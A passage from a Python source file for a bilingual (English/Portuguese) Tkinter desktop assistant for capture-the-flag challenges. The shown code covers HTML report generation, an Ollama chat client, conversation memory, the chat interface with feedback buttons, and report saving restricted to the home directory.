            <div class="alert alert-warning">
                <h5 class="alert-heading">Validation Warnings</h5>
                <ul>{warning_items}</ul>
            </div>"""

        tools_section = ""
        if valid_tools:
            tool_badges = "".join(
                f'<span class="badge bg-info me-1 mb-1">{self._esc(t)}</span>' for t in valid_tools
            )
            tools_section = f"""
            <div class="mt-3">
                <h5>Tools Referenced</h5>
                <div>{tool_badges}</div>
            </div>"""

        mode_badge = "Offline" if is_offline else "Online (Ollama)"
        mode_color = "warning" if is_offline else "success"

        prompt_section = f"""
        <div class="mt-4">
            <h4>Prompt Engineering Metrics</h4>
            <div class="row">
                <div class="col-md-3"><div class="card text-center p-3"><h6>Total Prompts</h6><h3>{prompt_stats['total_prompts']}</h3></div></div>
                <div class="col-md-3"><div class="card text-center p-3"><h6>Total Analyses</h6><h3>{prompt_stats['total_selections']}</h3></div></div>
                <div class="col-md-3"><div class="card text-center p-3"><h6>Avg Reward</h6><h3>{prompt_stats['avg_reward']:.2f}</h3></div></div>
                <div class="col-md-3"><div class="card text-center p-3"><h6>Next Evolution</h6><h3>{_APE_EVOLUTION_INTERVAL - prompt_stats['analysis_count']}</h3></div></div>
            </div>
        </div>"""

        title = "CTF Analysis Report" if lang == _LANG_EN else "Relatório de Análise CTF"

        return f"""<!DOCTYPE html>
<html lang="{lang}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title} - {timestamp}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {{ background-color: #0a0e17; color: #dfe6e9; font-family: 'Segoe UI', system-ui, sans-serif; }}
        .report-header {{ background: linear-gradient(135deg, #6c5ce7 0%, #a29bfe 100%); padding: 2rem; border-radius: 0 0 1rem 1rem; margin: -1.5rem -1.5rem 2rem -1.5rem; }}
        .card {{ background-color: #131825; border-color: #2d3436; }}
        .card-header {{ border-color: #2d3436; }}
        .analysis-box {{ background-color: #1a2035; border-left: 4px solid #6c5ce7; padding: 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }}
        .query-box {{ background-color: #161d30; border-left: 4px solid #74b9ff; padding: 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }}
        h1, h2, h3, h4, h5, h6 {{ color: #a29bfe; }}
        .text-muted {{ color: #636e72 !important; }}
        .badge {{ font-weight: 500; }}
        .footer {{ text-align: center; padding: 2rem; color: #636e72; margin-top: 3rem; border-top: 1px solid #2d3436; }}
        pre {{ background-color: #0a0e17; padding: 1rem; border-radius: 0.5rem; color: #00b894; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; }}
    </style>
</head>
<body>
    <div class="container py-4">
        <div class="report-header">
            <h1 class="text-white mb-1">Nova CTF Analysis</h1>
            <p class="text-white-50 mb-0">Generated: {timestamp} &nbsp; <span class="badge bg-{mode_color}">{mode_badge}</span></p>
        </div>
        <div class="query-box">
            <h5>Challenge Query</h5>
            <pre>{self._esc(current_query)}</pre>
        </div>
        <div class="analysis-box">
            <h5>Analysis Response</h5>
            <pre>{self._esc(current_response)}</pre>
        </div>
        {tools_section}
        {warnings_section}
        {similar_section}
        {prompt_section}
        <div class="footer">
            <p class="mb-0">Nova CTF Assistant - Episodic Memory + UCB1 Prompt Engineering</p>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>"""

    def _esc(self, text: str) -> str:
        return html.escape(text) if text else ""


class OllamaClient:
    @staticmethod
    def chat(messages: list, timeout: int = _OLLAMA_TIMEOUT) -> str:
        payload = json.dumps(
            {
                "model": _OLLAMA_MODEL,
                "messages": messages,
                "stream": False,
                "options": {
                    "temperature": 0.7,
                    "num_predict": 1024,
                    "repeat_penalty": 1.15,
                    "top_k": 40,
                    "top_p": 0.9,
                },
            },
            ensure_ascii=False,
        ).encode("utf-8")

        req = urllib.request.Request(
            _OLLAMA_URL,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )

        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = json.loads(resp.read().decode("utf-8"))

        content = body.get("message", {}).get("content", "")
        return _sanitise(content)


class ConversationMemory:
    def __init__(self, maxlen: int = _MAX_HISTORY):
        self._turns: deque = deque(maxlen=maxlen)

    def add(self, role: str, content: str):
        self._turns.append({"role": role, "content": content})

    def as_messages(self, system_content: str) -> list:
        msgs = [{"role": "system", "content": system_content}]
        msgs.extend(list(self._turns))
        return msgs

    def clear(self):
        self._turns.clear()

    def get_recent(self, n: int = 5) -> list:
        return list(self._turns)[-n:]


class ChatApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self._lang = None
        self._memory = ConversationMemory()
        self._client = OllamaClient()
        self._memory_store = EpisodicMemoryStore()
        self._prompt_manager = PromptManager()
        self._validator = HallucinationValidator()
        self._offline_engine = OfflineAnalysisEngine(self._memory_store, self._validator)
        self._report_gen = ReportGenerator(self._memory_store, self._prompt_manager)
        self._busy = False
        self._think_frame = 0
        self._think_after_id = None
        self._think_mark = None
        self._current_prompt = None
        self._current_episode_id = None
        self._current_similar = []
        self._current_validation = (True, [])
        self._last_response = ""
        self._last_query = ""
        self._last_was_offline = False
        self._feedback_frame = None

        self.title("Nova CTF Assistant")
        self.geometry("920x720")
        self.minsize(640, 520)
        self.configure(bg=_P["bg"])
        self.resizable(True, True)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        self._define_fonts()
        self._build_ui()
        self._post_welcome()

    def _define_fonts(self):
        self._f_body = tkfont.Font(family="Segoe UI", size=11)
        self._f_name = tkfont.Font(family="Segoe UI", size=9, weight="bold")
        self._f_header = tkfont.Font(family="Segoe UI", size=15, weight="bold")
        self._f_sub = tkfont.Font(family="Segoe UI", size=9)
        self._f_status = tkfont.Font(family="Segoe UI", size=8)
        self._f_btn = tkfont.Font(family="Segoe UI", size=10, weight="bold")
        self._f_system = tkfont.Font(family="Segoe UI", size=9, slant="italic")
        self._f_small_btn = tkfont.Font(family="Segoe UI", size=9)

    def _build_ui(self):
        self.rowconfigure(1, weight=1)
        self.columnconfigure(0, weight=1)
        self._build_header()
        self._build_chat_area()
        self._build_input_bar()
        self._build_status_bar()

    def _build_header(self):
        hdr = tk.Frame(self, bg=_P["surface"], height=62)
        hdr.grid(row=0, column=0, sticky="ew")
        hdr.columnconfigure(1, weight=1)
        hdr.grid_propagate(False)

        tk.Label(
            hdr, text="◉", fg=_P["success"], bg=_P["surface"], font=self._f_header
        ).grid(row=0, column=0, rowspan=2, padx=(18, 10), pady=8, sticky="ns")

        tk.Label(
            hdr, text="Nova CTF", fg=_P["accent2"], bg=_P["surface"], font=self._f_header
        ).grid(row=0, column=1, sticky="sw", pady=(12, 0))

        tk.Label(
            hdr,
            text="CTF Assistant - Episodic Memory - UCB1 Prompts",
            fg=_P["subtext"],
            bg=_P["surface"],
            font=self._f_sub,
        ).grid(row=1, column=1, sticky="nw", pady=(0, 10))

        btn_frame = tk.Frame(hdr, bg=_P["surface"])
        btn_frame.grid(row=0, column=2, rowspan=2, padx=(10, 18), pady=10)

        self._report_btn = tk.Button(
            btn_frame,
            text="Report",
            font=self._f_small_btn,
            bg=_P["surface2"],
            fg=_P["accent2"],
            activebackground=_P["accent"],
            activeforeground="#ffffff",
            relief="flat",
            borderwidth=0,
            padx=12,
            pady=4,
            cursor="hand2",
            command=self._generate_report,
        )
        self._report_btn.pack(side="left", padx=(0, 6))

        self._clear_btn = tk.Button(
            btn_frame,
            text="Clear",
            font=self._f_small_btn,
            bg=_P["surface2"],
            fg=_P["subtext"],
            activebackground=_P["danger"],
            activeforeground="#ffffff",
            relief="flat",
            borderwidth=0,
            padx=12,
            pady=4,
            cursor="hand2",
            command=self._clear_chat,
        )
        self._clear_btn.pack(side="left")

        tk.Frame(self, bg=_P["border"], height=1).grid(row=0, column=0, sticky="sew")

    def _build_chat_area(self):
        wrapper = tk.Frame(self, bg=_P["bg"])
        wrapper.grid(row=1, column=0, sticky="nsew")
        wrapper.rowconfigure(0, weight=1)
        wrapper.columnconfigure(0, weight=1)

        self._chat = tk.Text(
            wrapper,
            state="disabled",
            wrap="word",
            font=self._f_body,
            bg=_P["bg"],
            fg=_P["text"],
            relief="flat",
            borderwidth=0,
            padx=20,
            pady=14,
            cursor="arrow",
            spacing1=2,
            spacing3=2,
            selectbackground=_P["accent"],
            selectforeground="#ffffff",
        )
        self._chat.grid(row=0, column=0, sticky="nsew")

        sb = tk.Scrollbar(
            wrapper, orient="vertical", command=self._chat.yview,
            bg=_P["border"], troughcolor=_P["bg"], borderwidth=0, width=6,
        )
        sb.grid(row=0, column=1, sticky="ns")
        self._chat.configure(yscrollcommand=sb.set)

        self._chat.tag_configure("user_name", foreground=_P["accent3"], font=self._f_name, spacing1=16)
        self._chat.tag_configure("user_msg", foreground=_P["text"], font=self._f_body, lmargin1=14, lmargin2=14, rmargin=80, spacing3=4)
        self._chat.tag_configure("bot_name", foreground=_P["accent"], font=self._f_name, spacing1=16)
        self._chat.tag_configure("bot_msg", foreground=_P["text"], font=self._f_body, lmargin1=14, lmargin2=14, rmargin=80, spacing3=4)
        self._chat.tag_configure("system_msg", foreground=_P["subtext"], font=self._f_system, justify="center", spacing1=10, spacing3=10)
        self._chat.tag_configure("thinking", foreground=_P["accent"], font=self._f_system, spacing1=12, spacing3=4)
        self._chat.tag_configure("feedback_positive", foreground=_P["success"], font=self._f_small_btn)
        self._chat.tag_configure("feedback_negative", foreground=_P["danger"], font=self._f_small_btn)
        self._chat.tag_configure("offline_tag", foreground=_P["warning"], font=self._f_small_btn)

    def _build_input_bar(self):
        bar = tk.Frame(self, bg=_P["bg"])
        bar.grid(row=2, column=0, sticky="ew", padx=16, pady=(10, 12))
        bar.columnconfigure(0, weight=1)

        ef = tk.Frame(bar, bg=_P["entry_bg"], highlightbackground=_P["border"], highlightthickness=1)
        ef.grid(row=0, column=0, sticky="ew", padx=(0, 10))
        ef.columnconfigure(0, weight=1)

        self._input_var = tk.StringVar()
        self._entry = tk.Entry(
            ef, textvariable=self._input_var, font=self._f_body,
            bg=_P["entry_bg"], fg=_P["text"], insertbackground=_P["accent2"],
            relief="flat", borderwidth=0, selectbackground=_P["accent"], selectforeground="#ffffff",
        )
        self._entry.grid(row=0, column=0, sticky="ew", padx=12, pady=9)
        self._entry.bind("<Return>", self._on_send)
        self._entry.bind("<KP_Enter>", self._on_send)

        self._send_btn = tk.Button(
            bar, text="Send", font=self._f_btn, bg=_P["btn_bg"], fg="#ffffff",
            activebackground=_P["btn_active"], activeforeground="#ffffff",
            relief="flat", borderwidth=0, padx=20, pady=8, cursor="hand2", command=self._on_send,
        )
        self._send_btn.grid(row=0, column=1)
        self._send_btn.bind("<Enter>", lambda e: self._send_btn.configure(bg=_P["btn_active"]))
        self._send_btn.bind("<Leave>", lambda e: self._send_btn.configure(bg=_P["btn_bg"]))

    def _build_status_bar(self):
        self._status_var = tk.StringVar(value="")
        tk.Label(
            self, textvariable=self._status_var, bg=_P["bg"], fg=_P["subtext"],
            font=self._f_status, anchor="w",
        ).grid(row=3, column=0, sticky="ew", padx=20, pady=(0, 6))

    def _write(self, text: str, *tags):
        self._chat.configure(state="normal")
        self._chat.insert("end", text, tags)
        self._chat.configure(state="disabled")
        self._chat.see("end")

    def _append_user(self, msg: str):
        label = "You" if self._lang == _LANG_EN else "Você"
        self._write(f"\n{label}\n", "user_name")
        self._write(f"{msg}\n", "user_msg")

    def _append_bot(self, msg: str):
        self._write("\nNova\n", "bot_name")
        self._write(f"{msg}\n", "bot_msg")

    def _append_system(self, msg: str):
        self._write(f"\n{msg}\n", "system_msg")

    def _append_feedback_buttons(self):
        if self._feedback_frame:
            self._feedback_frame.destroy()
            self._feedback_frame = None

        self._chat.configure(state="normal")
        idx = self._chat.index("end - 1 char")
        self._chat.insert("end", "\n", ())
        frame = tk.Frame(self._chat, bg=_P["bg"])
        self._feedback_frame = frame

        up_btn = tk.Button(
            frame, text=" Helpful", font=self._f_small_btn, bg=_P["surface2"],
            fg=_P["success"], activebackground=_P["success"], activeforeground="#ffffff",
            relief="flat", borderwidth=0, padx=10, pady=2, cursor="hand2",
            command=lambda: self._on_feedback(1.0),
        )
        up_btn.pack(side="left", padx=(14, 4))

        down_btn = tk.Button(
            frame, text=" Not helpful", font=self._f_small_btn, bg=_P["surface2"],
            fg=_P["danger"], activebackground=_P["danger"], activeforeground="#ffffff",
            relief="flat", borderwidth=0, padx=10, pady=2, cursor="hand2",
            command=lambda: self._on_feedback(-0.5),
        )
        down_btn.pack(side="left", padx=4)

        self._chat.window_create(idx, window=frame)
        self._chat.insert("end", "\n", ())
        self._chat.configure(state="disabled")
        self._chat.see("end")

    def _on_feedback(self, reward: float):
        if self._current_prompt:
            self._prompt_manager.record_reward(self._current_prompt.id, reward)
        if self._current_episode_id:
            self._memory_store.update_reward(self._current_episode_id, reward)

        if self._feedback_frame:
            self._feedback_frame.destroy()
            self._feedback_frame = None

        self._chat.configure(state="normal")
        tag = "feedback_positive" if reward > 0 else "feedback_negative"
        self._chat.insert("end", "  Feedback recorded\n", tag)
        self._chat.configure(state="disabled")
        self._chat.see("end")
        self._check_appevolution()

    def _check_appevolution(self):
        should_evolve = self._prompt_manager.record_analysis()
        if should_evolve:
            threading.Thread(target=self._evolve_prompts, daemon=True).start()

    def _evolve_prompts(self):
        try:
            self._prompt_manager.evolve_prompts()
            if self._lang:
                msg = "Prompt evolution completed." if self._lang == _LANG_EN else "Evolução de prompt concluída."
                self.after(0, self._append_system, msg)
        except Exception:
            pass

    def _start_thinking(self):
        self._think_frame = 0
        self._chat.configure(state="normal")
        self._chat.insert("end", "\n", "bot_name")
        self._think_mark = self._chat.index("end - 1 char")
        self._chat.insert("end", _THINKING_FRAMES[0] + "\n", "thinking")
        self._chat.configure(state="disabled")
        self._chat.see("end")
        self._tick_thinking()

    def _tick_thinking(self):
        if not self._busy:
            return
        self._think_frame = (self._think_frame + 1) % len(_THINKING_FRAMES)
        self._chat.configure(state="normal")
        s = self._think_mark
        e = self._chat.index(f"{s} lineend + 1 char")
        self._chat.delete(s, e)
        self._chat.insert(s, _THINKING_FRAMES[self._think_frame] + "\n", "thinking")
        self._chat.configure(state="disabled")
        self._chat.see("end")
        self._think_after_id = self.after(400, self._tick_thinking)

    def _stop_thinking(self):
        if self._think_after_id:
            self.after_cancel(self._think_after_id)
            self._think_after_id = None
        if self._think_mark:
            self._chat.configure(state="normal")
            s = self._think_mark
            e = self._chat.index(f"{s} lineend + 1 char")
            prev = self._chat.index(f"{s} - 1 char")
            self._chat.delete(prev, e)
            self._chat.configure(state="disabled")
            self._think_mark = None

    def _set_busy(self, busy: bool):
        self._busy = busy
        state = "disabled" if busy else "normal"
        self._entry.configure(state=state)
        self._send_btn.configure(state=state)

    def _post_welcome(self):
        self._append_system("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        self._append_bot(
            "Hey there! Quick question before we dive in — do you prefer to chat in "
            "English or Portuguese? / Oi! Uma pergunta rápida antes de começarmos — "
            "você prefere conversar em Inglês ou Português?"
        )
        self._entry.focus_set()

    def _on_send(self, _event=None):
        raw = self._input_var.get().strip()
        if not raw or self._busy:
            return

        user_input = _sanitise_input(html.unescape(raw))
        self._input_var.set("")
        if not user_input:
            return

        if self._lang is None:
            detected = _detect_language(user_input)
            if detected is None:
                self._append_bot(
                    "Just to confirm, English or Português? / "
                    "Só para confirmar, Inglês ou Português?"
                )
                return
            self._lang = detected
            self._append_user(user_input)
            self._memory.add("user", user_input)
            greeting = _GREETING_MSG[self._lang]
            self._memory.add("assistant", greeting)
            self._append_bot(greeting)
            return

        self._append_user(user_input)

        if _FAREWELL_PATTERNS[self._lang].search(user_input):
            farewell = _FAREWELL_MSG[self._lang]
            self._memory.add("user", user_input)
            self._memory.add("assistant", farewell)
            self._append_bot(farewell)
            self._append_system("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            self.after(2200, self.destroy)
            return

        label = "Analyzing" if self._lang == _LANG_EN else "Analisando"
        self._status_var.set(f"{label}...")
        self._set_busy(True)
        self._start_thinking()

        threading.Thread(target=self._generate, args=(user_input,), daemon=True).start()

    def _generate(self, user_input: str):
        self._memory.add("user", user_input)
        similar_episodes = self._memory_store.retrieve_similar(user_input)
        self._current_similar = similar_episodes
        selected_prompt = self._prompt_manager.select_prompt()
        self._current_prompt = selected_prompt
        is_offline = False
        response = None

        try:
            lang_prefix = _LANG_PREFIX.get(self._lang, "")
            system_content = f"{lang_prefix}{selected_prompt.content}"

            if similar_episodes:
                memory_context = "\n\nRelevant past analyses for context:\n"
                for ep in similar_episodes[:2]:
                    safe_query = ep.get("query", "")[:300]
                    safe_response = _validate_memory_text(ep.get("response", ""))[:500]
                    memory_context += f"- Challenge: {safe_query}\n  Solution approach: {safe_response}\n\n"
                system_content += memory_context

            messages = self._memory.as_messages(system_content)
            response = self._client.chat(messages)

        except (urllib.error.URLError, TimeoutError, urllib.error.HTTPError, OSError):
            try:
                response = self._offline_engine.analyze(user_input, self._lang or _LANG_EN, similar_episodes)
                is_offline = True
            except Exception:
                response = (
                    "An error occurred. Please try again."
                    if self._lang == _LANG_EN
                    else "Ocorreu um erro. Por favor, tente novamente."
                )
                is_offline = True

        except Exception:
            try:
                response = self._offline_engine.analyze(user_input, self._lang or _LANG_EN, similar_episodes)
                is_offline = True
            except Exception:
                response = (
                    "An error occurred. Please try again."
                    if self._lang == _LANG_EN
                    else "Ocorreu um erro. Por favor, tente novamente."
                )
                is_offline = True

        if response is None:
            response = (
                "An error occurred. Please try again."
                if self._lang == _LANG_EN
                else "Ocorreu um erro. Por favor, tente novamente."
            )
            is_offline = True

        is_valid, warnings = self._validator.validate(response)
        self._current_validation = (is_valid, warnings)

        if warnings and self._lang == _LANG_EN:
            response = response + "\n[Note: Some referenced tools may need verification]"
        elif warnings and self._lang == _LANG_PT:
            response = response + "\n[Nota: Algumas ferramentas referenciadas podem precisar de verificação]"

        self._memory.add("assistant", response)
        self._last_response = response
        self._last_query = user_input
        self._last_was_offline = is_offline

        tools_used = list(set(_extract_commands(response)))
        detected_categories = []
        if is_offline:
            matches = self._offline_engine._match_knowledge(user_input)
            detected_categories = [m["category"] for m in matches[:_OFFLINE_MAX_MATCHES]]

        category_str = ", ".join(detected_categories) if detected_categories else ""

        episode_id = self._memory_store.store(
            query=user_input,
            response=response,
            prompt_id=selected_prompt.id,
            embedding=_deterministic_embedding(user_input),
            tools_used=tools_used,
            category=category_str,
            is_offline=is_offline,
        )
        self._current_episode_id = episode_id

        self.after(0, self._deliver, response)

    def _deliver(self, response: str):
        self._stop_thinking()
        self._append_bot(response)
        if self._last_was_offline:
            self._write("[Response from offline knowledge base]\n", "offline_tag")
        self._append_feedback_buttons()
        self._status_var.set("")
        self._set_busy(False)
        self._entry.focus_set()

    def _generate_report(self):
        if not self._last_response:
            if self._lang == _LANG_EN:
                messagebox.showinfo("No Data", "Send a query first to generate a report.")
            else:
                messagebox.showinfo("Sem Dados", "Envie uma consulta primeiro para gerar um relatório.")
            return

        filepath = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML files", "*.html"), ("All files", "*.*")],
            title="Save CTF Analysis Report",
            initialfile=f"nova_ctf_report_{int(time.time())}.html",
        )
        if not filepath:
            return

        try:
            safe_path = os.path.normpath(filepath)
            home = os.path.expanduser("~")
            if not os.path.commonpath([safe_path, home]) == home:
                raise ValueError("Invalid path")

            report_html = self._report_gen.generate(
                current_query=self._last_query or "N/A",
                current_response=self._last_response,
                similar_episodes=self._current_similar,
                prompt_used=self._current_prompt or PromptCandidate(id="unknown", content="Unknown"),
                validation_result=self._current_validation,
                is_offline=self._last_was_offline,
                lang=self._lang or _LANG_EN,
            )

            tmp_path = safe_path + ".tmp"
            with open(tmp_path, "w", encoding="utf-8") as f:
                f.write(report_html)
            os.replace(tmp_path, safe_path)

            msg = f"Report saved: {os.path.basename(safe_path)}"
            self._status_var.set(msg)
            self.after(5000, lambda: self._status_var.set(""))

        except PermissionError:
            if self._lang == _LANG_EN:
                messagebox.showerror("Error", "Permission denied. Choose a different location.")
            else:
                messagebox.showerror("Erro", "Permissão negada. Escolha outro local.")
        except ValueError:
            if self._lang == _LANG_EN:
                messagebox.showerror("Error", "Invalid save path.")
            else:
                messagebox.showerror("Erro", "Caminho de salvamento inválido.")
        except Exception:
            if self._lang == _LANG_EN:
                messagebox.showerror("Error", "Failed to save report.")
            else:
                messagebox.showerror("Erro", "Falha ao salvar relatório.")

    def _clear_chat(self):
        if self._busy:
            return

        self._chat.configure(state="normal")
        self._chat.delete("1.0", "end")
        self._chat.configure(state="disabled")

        self._memory.clear()
        self._last_response = ""
        self._last_query = ""
        self._last_was_offline = False
        self._current_episode_id = None
        self._current_similar = []
        self._current_validation = (True, [])
        self._current_prompt = None

        if self._feedback_frame:
            self._feedback_frame.destroy()
            self._feedback_frame = None

        self._append_system("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        msg = (
            "Chat cleared. Episodic memory preserved. Ready for new challenges."
            if self._lang == _LANG_EN
            else "Chat limpo. Memória episódica preservada. Pronto para novos desafios."
        )
        self._append_system(msg)
        self._append_system("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    def _on_close(self):
        self._busy = False
        if self._think_after_id:
            self.after_cancel(self._think_after_id)
        self.destroy()


if __name__ == "__main__":
    _ensure_data_dir()
    app = ChatApp()
    app.mainloop()
